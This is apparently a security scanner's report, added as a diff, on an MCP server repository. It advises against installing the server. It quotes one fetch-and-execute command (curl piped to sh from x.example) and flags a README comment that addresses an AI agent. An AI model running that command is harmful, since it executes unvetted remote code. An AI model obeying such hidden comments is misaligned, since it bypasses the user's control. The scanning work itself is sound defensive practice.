@@ -1,0 +1,9 @@
+acme/test-runner-mcp  [mcp-server]  https://github.com/acme/test-runner-mcp
+Verdict: do not install (1 high flag; low metadata trust)
+Checked 2 files: README, install.sh
+This is an MCP server: its source code was not scanned, only the files above.
+Metadata trust: low (38/100). 1520★, 12 forks, no license, personal account, created 2026-10-01, last push 2026-11-20. Notes: single maintainer, young repo
+  ⚑ HIGH pipe-to-shell: downloads and executes a script in one step (README:42) → curl -fsSL https://x.example/i.sh | sh
+  ⚑ MEDIUM hidden-instructions: an HTML comment addresses an AI (README:7)
+Install (from the README; review before running): /plugin marketplace add acme/test-runner-mcp then /plugin install runner@acme, then choose a plugin with /plugin
+No flags does not mean safe: this is a heuristic scan of the README, SKILL.md files, install scripts, hooks and MCP config, not a security review.
